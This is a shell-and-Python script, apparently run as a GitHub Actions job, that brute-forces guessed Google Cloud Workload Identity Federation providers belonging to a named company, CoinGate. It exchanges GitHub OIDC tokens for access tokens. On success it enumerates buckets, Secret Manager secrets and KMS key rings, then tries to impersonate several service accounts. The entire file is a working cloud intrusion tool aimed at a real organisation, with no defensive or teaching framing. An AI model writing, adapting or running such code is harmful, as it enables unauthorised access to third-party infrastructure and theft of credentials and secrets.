#!/bin/bash
set -u
echo "== GCP WIF probe (GitHub OIDC) =="
echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF run=$GITHUB_RUN_ID"
echo "id_token_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
python3 - <<'PY'
import os, json, base64, urllib.request, urllib.error, urllib.parse, time

TOK_URL=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
TOK=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")

def mint(aud=None):
    u=TOK_URL + (("&audience="+urllib.parse.quote(aud, safe='')) if aud else "")
    req=urllib.request.Request(u, headers={"Authorization":"bearer "+TOK})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)["value"]

def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4)
    return json.loads(base64.urlsafe_b64decode(p))

def post_json(url, obj, headers=None, timeout=30):
    data=json.dumps(obj).encode()
    h={"Content-Type":"application/json"}
    if headers: h.update(headers)
    req=urllib.request.Request(url, data=data, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, repr(e)

def get(url, headers=None, timeout=30):
    req=urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, repr(e)

def exchange(aud, jwt):
    return post_json("https://sts.googleapis.com/v1/token", {
        "audience": aud,
        "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
        "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
        "subjectToken": jwt })

base=mint()
print("BASE_CLAIMS=" + json.dumps(claims(base)))

P="//iam.googleapis.com/projects/"
CAND=[]
# positive controls (public projects known to have live providers)
for a in ["304398677251/locations/global/workloadIdentityPools/github/providers/github-provider",
          "654158993889/locations/global/workloadIdentityPools/github/providers/my-repo",
          "76767776102/locations/global/workloadIdentityPools/pineforge-github/providers/github-oidc"]:
    CAND.append(("POSCTRL:"+a.split("/")[0], P+a))
# CoinGate candidates
cg=[ "801733898470/locations/global/workloadIdentityPools/github/providers/oidc",
     "801733898470/locations/global/workloadIdentityPools/github/providers/github-oidc",
     "801733898470/locations/global/workloadIdentityPools/github/providers/github-actions",
     "801733898470/locations/global/workloadIdentityPools/github-actions/providers/oidc",
     "801733898470/locations/global/workloadIdentityPools/github-actions/providers/github-oidc",
     "801733898470/locations/global/workloadIdentityPools/github-oidc/providers/oidc",
     "801733898470/locations/global/workloadIdentityPools/oidc/providers/github",
     "801733898470/locations/global/workloadIdentityPools/oidc/providers/oidc",
     "801733898470/locations/global/workloadIdentityPools/github-pool/providers/github",
     "801733898470/locations/global/workloadIdentityPools/github-pool/providers/github-oidc",
     "801733898470/locations/global/workloadIdentityPools/cg-github/providers/github",
     "801733898470/locations/global/workloadIdentityPools/cg-github/providers/oidc",
     "801733898470/locations/global/workloadIdentityPools/cg-github-actions/providers/github",
     "801733898470/locations/global/workloadIdentityPools/cg-github-oidc/providers/github",
     "801733898470/locations/global/workloadIdentityPools/coingate-github/providers/github",
     "801733898470/locations/global/workloadIdentityPools/cicd/providers/github",
     "801733898470/locations/global/workloadIdentityPools/github/providers/actions",
     "801733898470/locations/global/workloadIdentityPools/workload-identity/providers/github",
     "801733898470/locations/global/workloadIdentityPools/github-deploy/providers/oidc",
     "801733898470/locations/global/workloadIdentityPools/gh-actions/providers/gh-actions",
     "617291421655/locations/global/workloadIdentityPools/github/providers/github-oidc",
     "617291421655/locations/global/workloadIdentityPools/github-actions/providers/oidc" ]
for a in cg: CAND.append(("CG", P+a))

results=[]; good=[]
for tag,aud in CAND:
    try:
        j=mint(aud)
    except Exception as e:
        print(f"AUD {aud} MINT_ERR {e!r}"); continue
    c,b=exchange(aud,j)
    short=b.replace("\n"," ")[:300]
    print(f"AUD [{c}] {tag} {aud}\n    {short}")
    results.append({"aud":aud,"http":c,"body":b})
    if c==200 or (c==400 and 'invalid_target' not in b):
        good.append({"aud":aud,"http":c,"token":(json.loads(b).get('access_token') if c==200 else None)})
    time.sleep(0.6)

print("SUMMARY=" + json.dumps([(r["aud"],r["http"]) for r in results]))

# consumption for any success
for g in good:
    at=g.get("token")
    if not at: continue
    hdr={"Authorization":"Bearer "+at, "x-goog-user-project":"coingate-prod"}
    for u in ["https://cloudresourcemanager.googleapis.com/v1/projects",
              "https://storage.googleapis.com/storage/v1/b?project=coingate-prod",
              "https://secretmanager.googleapis.com/v1/projects/coingate-prod/secrets",
              "https://cloudkms.googleapis.com/v1/projects/coingate-prod/locations/global/keyRings"]:
        c,b=get(u,hdr); print(f"CONSUME [{c}] {u}\n    {b[:400]}")
        time.sleep(0.5)
    for sa in ["coingate-prod@appspot.gserviceaccount.com",
               "801733898470-compute@developer.gserviceaccount.com",
               "terraform@coingate-prod.iam.gserviceaccount.com",
               "github@coingate-prod.iam.gserviceaccount.com",
               "cloudbuild@coingate-prod.iam.gserviceaccount.com"]:
        c,b=post_json("https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken"%urllib.parse.quote(sa,safe='@'), {"scope":["https://www.googleapis.com/auth/cloud-platform"]}, hdr)
        print(f"IMPERSONATE [{c}] {sa}\n    {b[:300]}")
        time.sleep(0.5)
print("DONE")
PY
